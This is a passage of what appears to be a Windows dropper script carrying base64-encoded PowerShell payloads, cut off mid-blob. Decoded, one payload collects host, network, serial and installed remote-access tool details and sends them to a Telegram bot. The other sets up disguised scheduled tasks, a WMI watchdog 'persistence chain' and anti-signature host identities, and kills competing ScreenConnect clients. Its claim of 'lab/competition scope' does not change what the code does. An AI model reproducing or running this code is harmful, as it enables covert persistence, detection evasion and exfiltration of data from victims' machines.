ICBET1dOICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNkE4KSkK
ICAgIFJFU1RPUkVEID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY3RTIp
KQogICAgRkFJTCAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3NEMpCiAgICBGT1JDRSAgICA9IFtz
dHJpbmddKFtjaGFyXTB4MjZBMSkKICAgIERFUExPWSAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252
ZXJ0RnJvbVV0ZjMyKDB4MUY2ODApKQogICAgSEIgICAgICAgPSAoW3N0cmluZ11bY2hhcl06OkNv
bnZlcnRGcm9tVXRmMzIoMHgxRjRFMSkpCn0KJGtleSA9ICRTdGF0ZS5Ub1VwcGVySW52YXJpYW50
KCkKJGVtb2ppID0gaWYgKCRlbW9qaU1hcC5Db250YWluc0tleSgka2V5KSkgeyAkZW1vamlNYXBb
JGtleV0gfSBlbHNlIHsgKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY0RjEp
KSB9CgokdGl0bGUgPSBzd2l0Y2ggKCRrZXkpIHsKICAgICdPSycgeyAnUHJpbWFyeSBoZWFsdGh5
JyB9CiAgICAnRE9XTicgeyAnUHJpbWFyeSBET1dOIC0gaGVhbGluZycgfQogICAgJ1JFU1RPUkVE
JyB7ICdQcmltYXJ5IFJFU1RPUkVEJyB9CiAgICAnRkFJTCcgeyAnSGVhbCBGQUlMRUQnIH0KICAg
ICdGT1JDRScgeyAnRm9yY2VkIHJlaW5zdGFsbCcgfQogICAgJ0RFUExPWScgeyBpZiAoJGRlcGxv
eU9rKSB7ICdGSVJTVCBERVBMT1kgT0snIH0gZWxzZSB7ICdGSVJTVCBERVBMT1kgLSBDSEVDSyBO
RUVERUQnIH0gfQogICAgJ0hCJyB7ICdob3VybHkgZGlnZXN0JyB9CiAgICBkZWZhdWx0IHsgIlN0
YXRlOiAkU3RhdGUiIH0KfQoKJHRyYW5zID0gaWYgKCRPbGRTdGF0ZSkgeyAiJE9sZFN0YXRlIC0+
ICRTdGF0ZSIgfSBlbHNlIHsgJFN0YXRlIH0KJHNjTGlzdCA9IEdldC1TY0luc3RhbGxzCiRybW1I
aXRzID0gR2V0LVJtbUhpdHMKaWYgKCRybW1IaXRzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRybW1I
aXRzLkFkZCgnLSAobm9uZSBkZXRlY3RlZCknKSB9CgokcHViID0gR2V0LVB1YmxpY0lwCiRsYW4g
PSBHZXQtTG9jYWxJcHMKJG5vdyA9IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06
c3Mgenp6JwokdXB0aW1lID0gJ24vYScKdHJ5IHsKICAgICRib290ID0gKEdldC1DaW1JbnN0YW5j
ZSBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0pLkxhc3RCb290VXBUaW1lCiAgICAkdXB0aW1lID0gJ3sw
OmRkfWQgezA6aGh9aCB7MDptbX1tJyAtZiAoKEdldC1EYXRlKSAtICRib290KQp9IGNhdGNoIHt9
CgojIGNhbXBhaWduIHN0YXRlIGZpbGUgKHdyaXR0ZW4gYnkgb3duX2xpYi5wczEgc3RhdGUgYWN0
aW9uKQokc3RhdGVMaW5lID0gJ24vYScKJHN0YXRlT2JqID0gJG51bGwKJHN0YXRlUGF0aDIgPSBK
b2luLVBhdGggJFdvcmtEaXIgJ3N0YXRlLmpzb24nCmlmIChUZXN0LVBhdGggJHN0YXRlUGF0aDIp
IHsKICAgICRyYXdTdGF0ZSA9IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aDIg
LVJhdykuVHJpbSgpCiAgICB0cnkgewogICAgICAgICRzdGF0ZU9iaiA9ICRyYXdTdGF0ZSB8IENv
bnZlcnRGcm9tLUpzb24KICAgICAgICAkZm9yZWlnbkNzdiA9IGlmICgkc3RhdGVPYmouZm9yZWln
bikgeyAoJHN0YXRlT2JqLmZvcmVpZ24gLWpvaW4gJywnKSB9IGVsc2UgeyAnLScgfQogICAgICAg
ICRzdGF0ZUxpbmUgPSAicHJpbT0kKCRzdGF0ZU9iai5wcmltKSBhbHQ9JCgkc3RhdGVPYmouYWx0
KSBmb3JlaWduPVskZm9yZWlnbkNzdl0gdGFza3M9JCgkc3RhdGVPYmoudGFza3NPaykvJCgkc3Rh
dGVPYmoudGFza3NUb3RhbCkgd2Q9JCgkc3RhdGVPYmoud2F0Y2hkb2cpIGhlYWxzPSQoJHN0YXRl
T2JqLmluc3RhbGxDb3VudCkiCiAgICB9IGNhdGNoIHsgJHN0YXRlTGluZSA9ICRyYXdTdGF0ZSB9
Cn0KCiRkZXBsb3lCbG9jayA9ICcnCmlmICgka2V5IC1lcSAnREVQTE9ZJykgewogICAgJHZlcmRp
Y3QgPSBpZiAoJGRlcGxveU9rKSB7ICdERVBMT1lFRCAvIEhFQUxUSFknIH0gZWxzZSB7ICdERVBM
T1lFRCBCVVQgSU5DT01QTEVURScgfQogICAgJGZvcmVpZ24gPSBAKEdldC1DaGlsZEl0ZW0gLVBh
dGggIiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgLURpcmVjdG9yeSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAt
bm90bWF0Y2ggKCI1ZjYwMTA1Nzk4NTJlNTA3fGY4NjFjODE0MGQ0NTM0Mjd8ezB9IiAtZiAoR2V0
LUdyeXhhS2VlcEZwKSkgfSkKICAgICRkaWFnTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xs
ZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQogICAgJGJvb3RQYXRoID0gSm9pbi1QYXRoICRX
b3JrRGlyICdib290LmVycicKICAgIGlmIChUZXN0LVBhdGggJGJvb3RQYXRoKSB7CiAgICAgICAg
JGludGVyZXN0aW5nID0gQCgKICAgICAgICAgICAgJ21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlf
JywgJ251a2VfJywgJ21zaV90b28nLCAnbXNpX2ZldGNoJywgJ21zaV9leGl0JywKICAgICAgICAg
ICAgJ21zaV91bmF2YWlsYWJsZScsICdzZWN1cmVfJywgJ2dvXycsICdleHRlcm1pbmF0ZV8nLCAn
aWRlbnRpdHlfJywKICAgICAgICAgICAgJ2NyZWF0ZV90YXNrJywgJ3ZlcmlmeV90YXNrJywgJ29y
cGhhbl8nLCAnc3RhbGVfJywgJ3Bvc3RpbnN0YWxsJywgJ2FsdF8nCiAgICAgICAgKQogICAgICAg
IEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkYm9vdFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgewogICAgICAgICAgICAgICAgJGxp
bmUgPSAkXwogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHQgaW4gJGludGVyZXN0aW5nKSB7IGlm
ICgkbGluZSAtbGlrZSAiKiR0KiIpIHsgcmV0dXJuICR0cnVlIH0gfQogICAgICAgICAgICAgICAg
JGZhbHNlCiAgICAgICAgICAgIH0gfAogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDI2
IHwKICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBbdm9pZF0kZGlhZ0xpbmVzLkFkZCgoJy0g
PGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAoJF8gLXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/
JykpKSkgfQogICAgfQogICAgaWYgKCRkaWFnTGluZXMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGRp
YWdMaW5lcy5BZGQoJy0gKG5vIGluc3RhbGwvbnVrZSBtYXJrZXJzIGluIGJvb3QuZXJyKScpIH0K
ICAgICRkZXBsb3lCbG9jayA9IEAiCgo8Yj5EZXBsb3kgdmVyZGljdDwvYj4KLSBSZXN1bHQ6IDxi
PiQoRXNjICR2ZXJkaWN0KTwvYj4KLSBQcmltYXJ5IFJ1bm5pbmc6ICQoaWYgKCRwcmltT2spIHsg
J1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIE1vbml0b3Igc2NyaXB0ICgud3VjYWNoZVxvd25fbW9u
LmNtZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIEJhY2t1cCBt
b24gKC5ldGxjYWNoZVxldGxfbW9uLmNtZCk6ICQoaWYgKCRoYXNFdGwpIHsgJ1lFUycgfSBlbHNl
IHsgJ05PJyB9KQotIFBlcnNpc3QgdGFza3MgT0s6ICR0YXNrT2sgLyAkKCRleHBlY3RlZFRhc2tz
LkNvdW50KSAoYmFkL21pc3Npbmc6ICR0YXNrQmFkKQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNp
emUpCi0gRm9yZWlnbiBTQyBmb2xkZXJzIGxlZnQ6ICQoJGZvcmVpZ24uQ291bnQpCi0gTm90ZTog
TGFzdFJlc3VsdCAyNjcwMTEgPSB0YXNrIG5vdCB5ZXQgcnVuIChub3JtYWwgcmlnaHQgYWZ0ZXIg
Y3JlYXRlKQoKPGI+RGVwbG95IGxvZyBtYXJrZXJzPC9iPgokKCRkaWFnTGluZXMgLWpvaW4gImBu
IikKIkAKfQoKJHRleHQgPSBAIgokZW1vamkgPGI+U0MgTW9uaXRvciAtICQoRXNjICR0aXRsZSk8
L2I+Cgo8Yj5FdmVudDwvYj4KLSBTdW1tYXJ5OiAkKEVzYyAkU3VtbWFyeSkKLSBUcmFuc2l0aW9u
OiA8Y29kZT4kKEVzYyAkdHJhbnMpPC9jb2RlPgotIFdoZW46ICQoRXNjICRub3cpCi0gU291cmNl
IGJ1aWxkOiA8Y29kZT4kKEVzYyAkQnVpbGQpPC9jb2RlPgokZGVwbG95QmxvY2sKCjxiPkhvc3Q8
L2I+Ci0gQ29tcHV0ZXI6IDxjb2RlPiQoRXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4KLSBV
c2VyOiA8Y29kZT4kKEVzYyAkd2hvKTwvY29kZT4KLSBFbGV2YXRlZDogJGVsZXYgfCBTWVNURU06
ICRpc1N5c3RlbQotIERvbWFpbi9Xb3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4pCgo8Yj5OZXR3
b3JrPC9iPgotIExBTiBJUHM6IDxjb2RlPiQoRXNjICRsYW4pPC9jb2RlPgotIFB1YmxpYyBJUDog
PGNvZGU+JChFc2MgJHB1Yik8L2NvZGU+Cgo8Yj5PUyAvIEhhcmR3YXJlPC9iPgotIE9TOiAkKEVz
YyAkb3MuQ2FwdGlvbikKLSBWZXJzaW9uOiAkKEVzYyAkb3MuVmVyc2lvbikgKGJ1aWxkICQoRXNj
ICRvcy5CdWlsZCkpICQoRXNjICRvcy5BcmNoKQotIEluc3RhbGw6ICQoRXNjICRvcy5JbnN0YWxs
RGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkKLSBVcHRpbWU6ICQoRXNjICR1
cHRpbWUpCi0gQ1BVOiAkKEVzYyAkb3MuQ1BVKQotIEhhcmR3YXJlOiAkKEVzYyAkb3MuTWFudWZh
Y3R1cmVyKSAkKEVzYyAkb3MuTW9kZWwpCi0gU2VyaWFsOiA8Y29kZT4kKEVzYyAkb3MuU2VyaWFs
KTwvY29kZT4KLSBSQU06ICQoJG9zLlRvdGFsUkFNX0dCKSBHQgotIERpc2sgQzogJCgkb3MuRGlz
a0ZyZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0IKCjxiPlNjcmVlbkNvbm5l
Y3QgKGFsbCk8L2I+Ci0gU2V2cnogPGNvZGU+NWY2MDEwNTc5ODUyZTUwNzwvY29kZT46ICQoRXNj
ICRwcmltTGluZSkKLSBBbHQgPGNvZGU+Zjg2MWM4MTQwZDQ1MzQyNzwvY29kZT46ICQoRXNjICRh
bHRMaW5lKQotIEdyeXhhIDxjb2RlPiQoRXNjIChHZXQtR3J5eGFLZWVwRnApKTwvY29kZT46ICQo
RXNjIChHZXQtU3ZjTGluZSAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICh7MH0pIiAtZiAoR2V0LUdy
eXhhS2VlcEZwKSkpKQokKCRzY0xpc3QgLWpvaW4gImBuIikKCjxiPk90aGVyIFJNTSAvIHJlbW90
ZSB0b29sczwvYj4KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQoKPGI+UGVyc2lzdCB0YXNrcyAoZXhw
ZWN0ZWQpPC9iPgokKCR0YXNrTGluZXMgLWpvaW4gImBuIikKCjxiPkNhY2hlPC9iPgotIE1TSSBj
YWNoZTogJChFc2MgJG1zaVNpemUpCi0gV29ya0RpcjogPGNvZGU+JChFc2MgJFdvcmtEaXIpPC9j
b2RlPgoKPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3QpPC9iPgotIDxj
b2RlPk1PTj0kYk1vbiB8IFNFQz0kYlNlYyB8IFRHUj0kYlRnciB8IExJQj0kYkxpYjwvY29kZT4K
CjxiPkNhbXBhaWduIHN0YXRlPC9iPgotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUpPC9jb2RlPgoK
PGk+Qm90OiBAbm9idWRkeXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4KIkAKCiMgY29tcGFj
dCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhlYXJ0YmVh
dCkKaWYgKCRNb2RlIC1lcSAnY29tcGFjdCcpIHsKICAgICRmb3JlaWduTiA9IDAKICAgIGlmICgk
c3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWlnbikgeyAkZm9yZWlnbk4gPSBAKCRzdGF0ZU9i
ai5mb3JlaWduKS5Db3VudCB9CiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRoICRtc2lDYWNo
ZSkgeyAnezA6TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8g
MUtCKSB9IGVsc2UgeyAnMCcgfQogICAgJHByaW1TaG9ydCA9IGlmICgkcHJpbU9rKSB7ICdPSycg
fSBlbHNlIHsgJ0RPV04nIH0KICAgICRhbHRTaG9ydCA9IGlmICgkYWx0TGluZSAtbGlrZSAnUnVu
bmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0KICAgICRncnl4YUxpbmUgPSBHZXQtU3ZjTGlu
ZSAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICh7MH0pIiAtZiAoR2V0LUdyeXhhS2VlcEZwKSkKICAg
ICRncnl4YVNob3J0ID0gaWYgKCRncnl4YUxpbmUgLWxpa2UgJ1J1bm5pbmcqJykgeyAnT0snIH0g
ZWxzZSB7ICctJyB9CiAgICAkdGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01QVVRFUk5BTUUp
fHNldj0kcHJpbVNob3J0fGdyeT0kZ3J5eGFTaG9ydHxhbHQ9JGFsdFNob3J0fGY9JGZvcmVpZ25O
fHQ9JHRhc2tPay81fGI9JEJ1aWxkIgp9CgppZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7CiAg
ICAkcm1tSGl0cyA9IEAoKCRybW1IaXRzIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMTIpKSArICgn
LSAuLi4gKHswfSBtb3JlKScgLWYgKCRybW1IaXRzLkNvdW50IC0gMTIpKQogICAgJHNjTGlzdCA9
IEAoKCRzY0xpc3QgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxNCkpICsgKCctIC4uLiAoezB9IG1v
cmUpJyAtZiAoJHNjTGlzdC5Db3VudCAtIDE0KSkKICAgICR0ZXh0ID0gJHRleHQuU3Vic3RyaW5n
KDAsIDM4MDApICsgImBuYG48aT5UUlVOQ0FURUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiIK
fQoKJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInCmZ1bmN0aW9uIFNlbmQtVGco
W3N0cmluZ10kbXNnLCBbc3RyaW5nXSRtb2RlKSB7CiAgICAkcGF5bG9hZCA9IEB7CiAgICAgICAg
Y2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lECiAgICAgICAgdGV4dCAgICAg
ICAgICAgICAgICAgICAgID0gJG1zZwogICAgICAgIGRpc2FibGVfd2ViX3BhZ2VfcHJldmlldyA9
ICR0cnVlCiAgICB9CiAgICBpZiAoJG1vZGUpIHsgJHBheWxvYWQucGFyc2VfbW9kZSA9ICRtb2Rl
IH0KICAgICRqc29uID0gJHBheWxvYWQgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgLURlcHRo
IDUKICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGpz
b24pCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn
L2JvdCQoJGNmZy5CT1RfVE9LRU4pL3NlbmRNZXNzYWdlIikgYAogICAgICAgIC1NZXRob2QgUG9z
dCAtQm9keSAkYnl0ZXMgLUNvbnRlbnRUeXBlICdhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0
Zi04JyB8IE91dC1OdWxsCn0KCmZ1bmN0aW9uIFNlbmQtVGdTYWZlKFtzdHJpbmddJG1zZywgW3N0
cmluZ10kbW9kZSkgewogICAgJHRvU2VuZCA9ICRtc2cKICAgIHRyeSB7CiAgICAgICAgU2VuZC1U
ZyAtbXNnICR0b1NlbmQgLW1vZGUgJG1vZGUKICAgICAgICByZXR1cm4gJHRydWUKICAgIH0gY2F0
Y2ggewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJz
dHJpbmcoMCwgMzAwMCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUKICAgICAg
ICAgICAgcmV0dXJuICR0cnVlCiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgIHJldHVybiAk
ZmFsc2UKICAgICAgICB9CiAgICB9Cn0KCnRyeSB7CiAgICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAk
dGV4dCAtbW9kZSAnSFRNTCcpIHsKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxv
ZyAtVmFsdWUgJ3RnX3NlbnRfcmljaCcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
IH0gZWxzZSB7CiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJwogICAgfQogICAgaWYgKCRrZXkg
LWVxICdERVBMT1knKSB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlCiAgICAgICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtE
aXIgJ2RlcGxveV90Zy5mbGFnJykgLVZhbHVlIChHZXQtRGF0ZSAtRm9ybWF0ICdvJykgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KfSBjYXRjaCB7CiAgICB0cnkgewogICAgICAg
ICRwbGFpbiA9IFtyZWdleF06OlJlcGxhY2UoJHRleHQsICc8W14+XSs+JywgJycpCiAgICAgICAg
JHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRpbGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQogICAg
ICAgIGlmICgkcGxhaW4uTGVuZ3RoIC1ndCAzNTAwKSB7ICRwbGFpbiA9ICRwbGFpbi5TdWJzdHJp
bmcoMCwgMzUwMCkgKyAiYG5UUlVOQ0FURUQiIH0KICAgICAgICBTZW5kLVRnU2FmZSAtbXNnICRw
bGFpbiAtbW9kZSAnJyB8IE91dC1OdWxsCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRo
ICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgfSBjYXRjaCB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZmFpbCAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICB9Cn0K
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDE4CiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZwojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBj
YW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4KIyBMMTg6IGV4dGVybWluYXRl
IHdhcyBLSUxMSU5HIEdyeXhhIChudWxsLXBhdGggcHJvYyBraWxsKTsgc3luYyBGUCBiZWZvcmUg
a2lsbC4KIyBMMTc6IEdyeXhhIHJlaW5zdGFsbCBMT0NLIHdoaWxlIGFueSBub24tc2V2cnogU0Mg
UnVubmluZzsgRlAgZHJpZnQgbmV2ZXIgL3guCiMgTDE2OiBORVZFUiByZWluc3RhbGwgR3J5eGEg
d2hlbiBSdW5uaW5nIChwYW5lbCBkdXBsaWNhdGVzKTsgVENQIGFkdmlzb3J5IG9ubHkuCiMgTDE1
OiBncnl4YS1oZWFsdGggLyBncnl4YS1lbnN1cmUg4oCUIDhoIGRlZXAgY2hlY2sgKFRDUC9yZWxh
eS9GUCBkcmlmdCByZWluc3RhbGwpLgojIEwxMzogc2NodGFza3MgQ3JlYXRlIHZpYSBjbWQgKGxp
a2UgV3VjYWNoZU93biksIFRSIHVuZGVyIFdpbmRvd3NcVGVtcFwud3VjYWNoZQojICAgICAgKG5v
dCBBQ0wtbG9ja2VkIFByb2dyYW1EYXRhIHBhdGgpLCAvU1QgMDA6MDAgb24gTUlOVVRFLCBubyBs
ZWFkaW5nIFwuCiMgTDEyOiBJREVOVFZFUj03IFJPT1QtbGV2ZWwgdGFzayBuYW1lcyAobmVzdGVk
IE1pY3Jvc29mdFxXaW5kb3dzIEFjY2VzcyBEZW5pZWQpLgojIEwxMTogTkVWRVIgcmV1c2UgcmVh
bCBXaW5kb3dzIGJ1aWx0LWluIHRhc2sgbmFtZXM7IFRSIG93bmVyc2hpcCBjaGVja3MuCiMgQXV0
aG9yaXplZCBpbnRlcm5hbCBkZXBsb3ltZW50IC0gbGFiL2NvbXBldGl0aW9uIHNjb3BlIG9ubHku
CiMg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCltDbWRsZXRCaW5kaW5nKCldCnBhcmFtKAogICAgW1BhcmFt
ZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICBbVmFsaWRhdGVTZXQoJ2luaXQnLCAnd2F0Y2hk
b2cnLCAnd2F0Y2hkb2ctZW5zdXJlJywgJ3Rhc2tzLWVuc3VyZScsICdzdGF0ZScsICdpZGVudGl0
eScsICdyZXBhaXInLCAncmVnaXN0ZXJlZCcsICdleHRlcm1pbmF0ZScsICdncnl4YS1oZWFsdGgn
LCAnZ3J5eGEtZW5zdXJlJyldCiAgICBbc3RyaW5nXSRBY3Rpb24sCiAgICBbc3RyaW5nXSRXb3Jr
RGlyID0gJ0M6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hl
JywKICAgIFtzdHJpbmddJE1vblBhdGggPSAnJywKICAgIFtzdHJpbmddJEJ1aWxkICA9ICdPMTUn
LAogICAgW3N0cmluZ10kRXh0cmEgID0gJycsCiAgICBbc3RyaW5nXSRGcCAgICAgPSAnJywKICAg
IFtzd2l0Y2hdJERlZXAsCiAgICBbc3dpdGNoXSRGb3JjZQopCgokRXJyb3JBY3Rpb25QcmVmZXJl
bmNlID0gJ1NpbGVudGx5Q29udGludWUnCiRjZmdQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdp
ZGVudGl0eS5jZmcnCiRJZGVudFZlcnNpb24gPSA4CgojIFJvb3QtbGV2ZWwgbmFtZXMgV0lUSE9V
VCBsZWFkaW5nIGJhY2tzbGFzaCAobWF0Y2hlcyB3b3JraW5nIFd1Y2FjaGVPd24gc3R5bGUpLgok
UG9vbHMgPSBAewogICAgQSA9IEAoJ1dlclF1ZXVlU3luYycsJ0RpYWdIb3N0Q2FjaGUnLCdOZXRU
cmFjZUNhY2hlJywnV2RpSG9zdFByb3h5JywnUGxhU2VydmVySGVhbHRoJywnVGNwSXBDb25mbGlj
dFJlcycsJ1NyQ2FjaGVTeW5jJywnUmVzb2x1dGlvblF1ZXVlJykKICAgIEIgPSBAKCdQbGFTZXJ2
ZXJIZWFsdGgnLCdXZGlIb3N0UHJveHknLCdXZXJRdWV1ZVN5bmMnLCdOZXRUcmFjZUNhY2hlJywn
RGlhZ0hvc3RDYWNoZScsJ1RjcElwQ29uZmxpY3RSZXMnLCdQbGFTZXJ2ZXJEaWFnJywnU3JDYWNo
ZVN5bmMnKQogICAgQyA9IEAoJ1Jlc29sdXRpb25RdWV1ZScsJ05ldFRyYWNlQ2FjaGUnLCdUY3BJ
cENvbmZsaWN0UmVzJywnV2VyUXVldWVTeW5jJywnUGxhU2VydmVySGVhbHRoJywnRGlhZ0hvc3RD
YWNoZScsJ1BsYVNlcnZlckRpYWcnLCdXZGlIb3N0UHJveHknKQogICAgRCA9IEAoJ1RjcElwQ29u
ZmxpY3RSZXMnLCdSZXNvbHV0aW9uUXVldWUnLCdOZXRUcmFjZUNhY2hlJywnRGlhZ0hvc3RDYWNo
ZScsJ1BsYVNlcnZlckRpYWcnLCdXZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdXZGlI
b3N0UHJveHknKQp9CiREZWZhdWx0cyA9IFtvcmRlcmVkXUB7CiAgICBUQVNLX0EgPSAnV2VyUXVl
dWVTeW5jJwogICAgVEFTS19CID0gJ1BsYVNlcnZlckhlYWx0aCcKICAgIFRBU0tfQyA9ICdXZGlI
b3N0UHJveHknCiAgICBUQVNLX0QgPSAnVGNwSXBDb25mbGljdFJlcycKICAgIE1PX0EgICA9ICcy
JwogICAgTU9fQiAgID0gJzMnCn0KCmZ1bmN0aW9uIEdldC1Ib3N0U2VlZCB7CiAgICAkcyA9IDBM
CiAgICBmb3JlYWNoICgkYyBpbiAkZW52OkNPTVBVVEVSTkFNRS5Ub1VwcGVyKCkuVG9DaGFyQXJy
YXkoKSkgeyAkcyA9ICgkcyAqIDMxICsgW2ludF0kYykgJSAxMDAwMDAwMDA3IH0KICAgIHJldHVy
biAkcwp9CgpmdW5jdGlvbiBSZWFkLUlkZW50aXR5IHsKICAgICRpZCA9ICREZWZhdWx0cy5DbG9u
ZSgpCiAgICBpZiAoVGVzdC1QYXRoICRjZmdQYXRoKSB7CiAgICAgICAgZm9yZWFjaCAoJGxpbmUg
aW4gKEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAtRm9yY2UpKSB7CiAgICAgICAg
ICAgIGlmICgkbGluZSAtbWF0Y2ggJ15ccyooW0EtWl9dKylccyo9XHMqKC4rPylccyokJykgeyAk
aWRbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQogICAgICAgIH0KICAgIH0KICAgIHJldHVy
biAkaWQKfQoKZnVuY3Rpb24gUmVtb3ZlLVRhc2tRdWlldChbc3RyaW5nXSR0bikgewogICAgaWYg
KCR0bikgeyAmIHNjaHRhc2tzLmV4ZSAvRGVsZXRlIC9UTiAkdG4gL0YgMj4mMSB8IE91dC1OdWxs
